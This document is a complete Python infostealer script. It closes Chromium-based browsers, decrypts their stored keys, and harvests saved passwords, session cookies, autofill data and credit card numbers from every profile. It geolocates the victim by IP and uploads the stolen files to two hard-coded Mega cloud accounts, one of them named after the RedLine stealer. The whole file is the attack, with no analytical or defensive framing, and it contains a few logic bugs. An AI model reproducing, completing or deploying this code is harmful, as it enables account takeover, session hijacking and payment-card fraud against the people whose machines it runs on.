import os
import json
import base64
import win32crypt
import sqlite3
import requests
import random
import string
from mega import Mega
from datetime import datetime
from Crypto.Cipher import AES

# Function to close Chrome
def close_browsers(browser_names):
    try:
        for browser_name in browser_names:
            if browser_name == "chrome":
                os.system("taskkill /f /im chrome.exe")
            elif browser_name == "edge":
                os.system("taskkill /f /im msedge.exe")
            elif browser_name == "opera":
                os.system("taskkill /f /im opera.exe")
            elif browser_name == "brave":
                os.system("taskkill /f /im brave.exe")
            else:
                print(f"Unsupported browser: {browser_name}")
    except Exception as e:
        print(f"Error closing browsers: {e}")

# Function to get the user's country based on IP
def get_country_by_ip():
    try:
        response = requests.get('https://ipinfo.io')
        data = response.json()
        country = data.get('country')
        return country if country else "Not found"
    except requests.RequestException:
        return "Error fetching data"
current_country = get_country_by_ip() or 'Unknown'

# Function to get the current IP address
def get_current_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        data = response.json()
        current_ip = data.get('ip')
        return current_ip if current_ip else "Not found"
    except requests.RequestException:
        return "Error fetching IP"
current_ip = get_current_ip() or 'Unknown'

# Generate a unique folder name
current_time = datetime.now().strftime("%Y_%m_%d_%H-%M-%S")
code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
folder_name = f"[{current_country}]_[{code}]_[{current_time}]_[{current_ip}]"
folder_cookies_name = 'Cookies'
folder_autofill_name = 'Autofills'
folder_credit_cards_name = 'CC'
results_folder_path = os.path.expanduser(f'~/.vbsfiles/{folder_name}')
cookies_folder_path = os.path.expanduser(f'{results_folder_path}/{folder_cookies_name}')
autofill_folder_path = os.path.expanduser(f'{results_folder_path}/{folder_autofill_name}')
credit_cards_folder_path = os.path.expanduser(f'{results_folder_path}/{folder_credit_cards_name}')
important_autofill_file_path = os.path.join(results_folder_path, "ImportantAutofills.txt")
passwords_path = f'{results_folder_path}/Passwords.txt'

# Log in to Mega Account 1
mega_account_1 = Mega()
MEGA_EMAIL_1 = 'Mega-redline-stealer1@outlook.com'
MEGA_PASSWORD_1 = 'redline-stealer22@@**'
mega_account_1.login(MEGA_EMAIL_1, MEGA_PASSWORD_1)

# Log in to Mega Account 2
mega_account_2 = Mega()
MEGA_EMAIL_2 = "PLACEHOLDER_EMAIL"
MEGA_PASSWORD_2 = "PLACEHOLDER_PASSWORD"
mega_account_2.login(MEGA_EMAIL_2, MEGA_PASSWORD_2)

# Function to get absolute file paths in a directory
def absoluteFilePaths(directory):
    for dirpath, _, filenames in os.walk(directory):
        for f in filenames:
            yield os.path.abspath(os.path.join(dirpath, f))

# Function to create a folder in a Mega account if it doesn't exist
def create_folder_if_not_exists(mega_instance, folder_name):
    if not mega_instance.find(folder_name):
        mega_instance.create_folder(folder_name)

def is_file_exists_and_nonempty(file_path):
    """Check if a file exists and is non-empty."""
    return os.path.isfile(file_path) and os.path.getsize(file_path) > 0

def upload_to_mega(upload_names):
    try:
        for upload_name in upload_names:
            if upload_name == "Cookies":
                cookie_files = list(absoluteFilePaths(cookies_folder_path))
                if not any(is_file_exists_and_nonempty(file_path) for file_path in cookie_files):
                    print("No existing non-empty cookie files to upload.")
                    return
                create_folder_if_not_exists(mega_account_1, f'{folder_name}/{folder_cookies_name}')
                create_folder_if_not_exists(mega_account_2, f'{folder_name}/{folder_cookies_name}')
                for file_path in cookie_files:
                    folder_account_cookies_1 = mega_account_1.find(f'{folder_name}/{folder_cookies_name}')
                    folder_account_cookies_2 = mega_account_2.find(f'{folder_name}/{folder_cookies_name}')
                    mega_account_1.upload(file_path, folder_account_cookies_1[0])
                    mega_account_2.upload(file_path, folder_account_cookies_2[0])
            elif upload_name == "Passwords":
                if not is_file_exists_and_nonempty(passwords_path):
                    print("No existing non-empty passwords file to upload.")
                    return
                create_folder_if_not_exists(mega_account_1, f'{folder_name}')
                create_folder_if_not_exists(mega_account_2, f'{folder_name}')
                file_passwords_1 = mega_account_1.find(folder_name)
                file_passwords_2 = mega_account_2.find(folder_name)
                mega_account_1.upload(passwords_path, file_passwords_1[0])
                mega_account_2.upload(passwords_path, file_passwords_2[0])
            elif upload_name == "All_Autofills":
                autofill_files = list(absoluteFilePaths(autofill_folder_path))
                if not any(is_file_exists_and_nonempty(file_path) for file_path in autofill_files):
                    print("No existing non-empty autofill files to upload.")
                    return
                create_folder_if_not_exists(mega_account_1, f'{folder_name}/{folder_autofill_name}')
                create_folder_if_not_exists(mega_account_2, f'{folder_name}/{folder_autofill_name}')
                for file_path in autofill_files:
                    folder_account_autofills_1 = mega_account_1.find(f'{folder_name}/{folder_autofill_name}')
                    folder_account_autofills_2 = mega_account_2.find(f'{folder_name}/{folder_autofill_name}')
                    mega_account_1.upload(file_path, folder_account_autofills_1[0])
                    mega_account_2.upload(file_path, folder_account_autofills_2[0])
            elif upload_name == "Important_Autofills":
                if not is_file_exists_and_nonempty(important_autofill_file_path):
                    print("No existing non-empty important autofill file to upload.")
                    return
                create_folder_if_not_exists(mega_account_1, f'{folder_name}')
                create_folder_if_not_exists(mega_account_2, f'{folder_name}')
                file_autofill_1 = mega_account_1.find(folder_name)
                file_autofill_2 = mega_account_2.find(folder_name)
                mega_account_1.upload(important_autofill_file_path, file_autofill_1[0])
                mega_account_2.upload(important_autofill_file_path, file_autofill_2[0])
            elif upload_name == "Credit cards":
                credit_card = list(absoluteFilePaths(credit_cards_folder_path))
                if not any(is_file_exists_and_nonempty(file_path) for file_path in credit_card):
                    print("No existing non-empty Credit cards files to upload.")
                    return
                create_folder_if_not_exists(mega_account_1, f'{folder_name}/{folder_credit_cards_name}')
                create_folder_if_not_exists(mega_account_2, f'{folder_name}/{folder_credit_cards_name}')
                for file_path in autofill_files:
                    folder_account_credit_cards_1 = mega_account_1.find(f'{folder_name}/{folder_credit_cards_name}')
                    folder_account_credit_cards_2 = mega_account_2.find(f'{folder_name}/{folder_credit_cards_name}')
                    mega_account_1.upload(file_path, folder_account_credit_cards_1[0])
                    mega_account_2.upload(file_path, folder_account_credit_cards_2[0])
    except Exception as e:
        print(f"Error uploading to Mega: {e}")

# Function to get the secret key for Chrome, Edge, Opera, or Brave
def get_secret_key(browser_name):
    try:
        if browser_name == "Google_[Chrome]":
            path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
        elif browser_name == "Microsoft_[Edge]":
            path = os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State'
        elif browser_name == "Opera Software_[opera]":
            path = os.path.expanduser('~') + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State'
        elif browser_name == "Brave Software_[brave]":
            path = os.path.expanduser('~') + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State'
        else:
            raise ValueError("Invalid browser name. Use 'chrome', 'edge', 'opera', or 'brave'.")
        with open(path, 'r', encoding='utf-8') as file:
            data = json.loads(file.read())
            encrypted_key = data.get('os_crypt', {}).get('encrypted_key')
            if encrypted_key:
                encrypted_key = base64.b64decode(encrypted_key)
                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return secret_key
        print(f"No valid data found for {browser_name.capitalize()}.")
        return None
    except Exception as e:
        print(f"Error: {e}")
        return None

# Function to decrypt passwords
def decrypt_password(encrypted_password, secret_key):
    iv = encrypted_password[3:15]
    encrypted_password = encrypted_password[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, iv)
    decrypted_password = cipher.decrypt(encrypted_password)
    return decrypted_password.decode('utf-8')

# Function to find profile paths for Chrome, Edge, Opera, or Brave
def find_profile_paths(browser_name):
    try:
        if browser_name == "Google_[Chrome]":
            base_path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\'
        elif browser_name == "Microsoft_[Edge]":
            base_path = os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\'
        elif browser_name == "Opera Software_[opera]":
            base_path = os.path.expanduser('~') + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\'
        elif browser_name == "Brave Software_[brave]":
            base_path = os.path.expanduser('~') + '\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\'
        else:
            raise ValueError("Invalid browser name. Use 'chrome', 'edge', 'opera', or 'brave'.")
        profile_paths = []
        for item in os.listdir(base_path):
            if item.startswith('Profile') or item == 'Default':
                profile_path = os.path.join(base_path, item)
                if os.path.isdir(profile_path):
                    profile_paths.append(profile_path)
        return profile_paths
    except Exception as e:
        print(f"Error finding {browser_name.capitalize()} profile paths: {e}")
        return []
    
# Function to collect browser passwords
def collect_browser_passwords(browser_name):
    passwords = []
    profile_paths = find_profile_paths(browser_name)
    secret_key = get_secret_key(browser_name)
    if secret_key:
        for profile_path in profile_paths:
            try:
                profile_name = os.path.basename(profile_path)
                application_label = f'Application: {browser_name.capitalize()}_{profile_name}'
                connection = sqlite3.connect(os.path.join(profile_path, 'Login Data'))
                cursor = connection.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for url, username, password in cursor.fetchall():
                    if password:
                        decrypted_password = decrypt_password(password, secret_key)
                        passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{application_label}\n" + "=" * 79)
                connection.close()
            except Exception as e:
                print(f"Error collecting {browser_name.capitalize()} passwords: {e}")
    return passwords

# Function to decrypt cookies
def decrypt_cookie(encrypted_value, secret_key):
    try:
        iv = encrypted_value[3:15]
        encrypted_value = encrypted_value[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_value = cipher.decrypt(encrypted_value)[:-16]
        return decrypted_value.decode('utf-8')
    except Exception as e:
        print(f"Error decrypting cookie: {e}")
        return None

def collect_browser_cookies(browser_name, profile_path=None):
    if profile_path:
        profile_paths = [profile_path]
    else:
        profile_paths = find_profile_paths(browser_name)
    secret_key = get_secret_key(browser_name)
    all_cookies = []
    if secret_key:
        for profile_path in profile_paths:
            try:
                connection = sqlite3.connect(os.path.join(profile_path, 'Network', 'Cookies'))
                cursor = connection.cursor()
                cursor.execute('SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies')
                cookies = []
                for row in cursor.fetchall():
                    host_key, name, path, is_secure, expires_utc, encrypted_value = row
                    decrypted_value = decrypt_cookie(encrypted_value, secret_key)
                    cookies.append((host_key, name, path, is_secure, expires_utc, decrypted_value))
                profile_name = os.path.basename(profile_path) if profile_path else 'Default'
                file_name = f'{cookies_folder_path}/{browser_name.capitalize()}_{profile_name} Network.txt'
                save_as_netscape_format(cookies, file_name)
                connection.close()
                all_cookies.extend(cookies)
            except Exception as e:
                print(f"Error collecting {browser_name.capitalize()} cookies: {e}")
    return all_cookies

def collect_autofill_data(browser_name, profile_path):
    autofill_data = []
    db_path = os.path.join(profile_path, 'Web Data')
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")
        autofill_data = cursor.fetchall()
        cursor.close()
        conn.close()
    except Exception as e:
        print(f"Error collecting Autofill data from {browser_name}: {e}")
    return autofill_data

def decrypt_credit_card(encrypted_value, secret_key):
    try:
        iv = encrypted_value[3:15]
        encrypted_value = encrypted_value[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_value = cipher.decrypt(encrypted_value)[:-16]
        return decrypted_value.decode('utf-8')
    except Exception as e:
        print(f"Error decrypting credit card data: {e}")
        return None

def extract_credit_card_data(browser_path, key):
    credit_card_data = []
    db_path = os.path.join(browser_path, 'Web Data')
    try:
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for row in cursor.fetchall():
                guid, name_on_card, expiration_month, expiration_year, encrypted_card_number = row
                decrypted_card_number = decrypt_credit_card(encrypted_card_number, key)
                credit_card_data.append({
                    'guid': guid,
                    'name_on_card': name_on_card,
                    'expiration_month': expiration_month,
                    'expiration_year': expiration_year,
                    'card_number': decrypted_card_number
                })
    except Exception as e:
        print(f"Error extracting credit card data: {e}")
    return credit_card_data

# Function to save cookies in Netscape format
def save_as_netscape_format(cookies, file_name):
    if not cookies:  # Check if the cookies list is empty
        print("No cookies to save.")
        return
    os.makedirs(cookies_folder_path, exist_ok=True)
    try:
        with open(file_name, 'w', encoding='utf-8') as file:
            for host, name, path, secure, expires, value in cookies:
                secure_flag = 'TRUE' if secure else 'FALSE'
                expires = int(expires) / 1000000 - 11644473600  # Convert to Unix time
                line = f"{host}\t{secure_flag}\t{path}\t{secure_flag}\t{expires}\t{name}\t{value}\n"
                file.write(line)
    except Exception as e:
        print(f"Error saving cookies: {e}")

# Function to save passwords to a file
def save_passwords_to_file(passwords, file_path):
    if not passwords:
        print("No passwords to save.")
        return
    os.makedirs(results_folder_path, exist_ok=True)
    try:
        with open(f'{results_folder_path}/{file_path}', 'w', encoding='utf-8') as file:
            for password_data in passwords:
                file.write(password_data + "\n")
    except Exception as e:
        print(f"Error saving passwords: {e}")

def save_autofill_data(autofill_data, browser_name, profile_path, autofill_folder_path):
    if not autofill_data:
        print(f"No autofill data to save for {browser_name} in {profile_path}.")
        return

    profile_name = os.path.basename(profile_path)
    file_name = f"{browser_name}_{profile_name}.txt"
    file_path = os.path.join(autofill_folder_path, file_name)
    os.makedirs(autofill_folder_path, exist_ok=True)
    try:
        with open(file_path, 'w', encoding='utf-8') as file:
            for name, value in autofill_data:
                file.write(f"\nName: {name}\nValue: {value}\n"+ "=" * 79)
    except Exception as e:
        print(f"Error saving Autofill data: {e}")

def save_important_autofill_data(autofill_data, important_autofill_file_path):
    important_elements = [
        'address', 'email', 'lastName', 'data[Member][email]',  # etc. - replace with actual strings
        # ... more elements here ...
    ]

    if not autofill_data or not all(isinstance(entry, tuple) and len(entry) >= 2 for entry in autofill_data):
        print("No valid autofill data to process.")
        return

    has_important_data = any(any(important_element in name for important_element in important_elements) for name, _ in autofill_data)
    if not has_important_data:
        print("No important autofill data to save.")
        return
    
    os.makedirs(results_folder_path, exist_ok=True)
    try:
        with open(important_autofill_file_path, 'a', encoding='utf-8') as file:
            for name, value in autofill_data:
                if any(important_element in name for important_element in important_elements):
                    file.write(f"\nName: {name}\nValue: {value}\n"+ "=" * 79)
    except Exception as e:
        print(f"Error saving important autofill data: {e}")

def save_credit_cards_as_text(credit_cards, browser_name, profile_name, folder_path):
    if not credit_cards:
        print(f"No credit card data to save for {browser_name} profile {profile_name}.")
        return

    os.makedirs(folder_path, exist_ok=True)
    file_name = f"{browser_name}_{profile_name}"
    file_path = os.path.join(folder_path, file_name)

    try:
        with open(file_path, 'w', encoding='utf-8') as file:
            for card in credit_cards:
                line = f"GUID: {card['guid']}\nName on Card: {card['name_on_card']}\n" \
                       f"Expiration Month: {card['expiration_month']}\n" \
                       f"Expiration Year: {card['expiration_year']}\n" \
                       f"Card Number: {card['card_number']}\n" + "=" * 40 + "\n"
                file.write(line)
    except Exception as e:
        print(f"Error saving credit card data for {browser_name} profile {profile_name}: {e}")

def save(save_names):
    browser_names = ["Google_[Chrome]", "Microsoft_[Edge]", "Opera Software_[opera]", "Brave Software_[brave]"]
    all_cookies = []
    all_passwords = []
    try:
        for save_name in save_names:
            if save_name == "Cookies":
                for browser_name in browser_names:
                    profile_paths = find_profile_paths(browser_name)
                    cookies = []
                    for profile_path in profile_paths:
                        cookies.extend(collect_browser_cookies(browser_name, profile_path))
                    all_cookies.extend(cookies)
            elif save_name == "Autofills":
                for browser_name in browser_names:
                    profile_paths = find_profile_paths(browser_name)
                    for profile_path in profile_paths:
                        autofill_data = collect_autofill_data(browser_name, profile_path)
                        save_autofill_data(autofill_data, browser_name, profile_path, autofill_folder_path)
                        save_important_autofill_data(autofill_data, important_autofill_file_path)
            elif save_name == "Passwords":
                for browser_name in browser_names:
                    passwords = collect_browser_passwords(browser_name)
                    all_passwords.extend(passwords)
                save_passwords_to_file(all_passwords, 'Passwords.txt')
            elif save_names == "Credit cards":
                for browser_name in browser_names:
                    profile_paths = find_profile_paths(browser_name)
                    secret_key = get_secret_key(browser_name)
                    for profile_path in profile_paths:
                        profile_name = os.path.basename(profile_path)
                        credit_cards = extract_credit_card_data(profile_path, secret_key)
                        save_credit_cards_as_text(credit_cards, browser_name, profile_name, credit_cards_folder_path)

    except Exception as e:
        print(f"Error saving {save_name} data: {e}")

def main():
    close_browsers(["chrome", "edge", "opera", "brave"])
    save(["Cookies", "Autofills", "Passwords", "Credit cards"])
    upload_to_mega(["Cookies", "All_Autofills", "Passwords", "Important_Autofills", "Credit cards"])
if __name__ == "__main__":
    main()
